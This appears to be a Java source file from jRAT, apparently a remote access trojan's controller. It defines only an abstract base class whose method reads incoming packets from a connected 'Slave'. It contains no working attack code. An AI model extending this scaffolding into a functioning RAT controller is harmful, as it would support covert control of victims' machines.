package jrat.controller.packets.incoming;

import jrat.controller.Slave;
import java.io.DataInputStream;


public abstract class AbstractIncomingPacket {

	public abstract void read(Slave slave, DataInputStream dis) throws Exception;

}
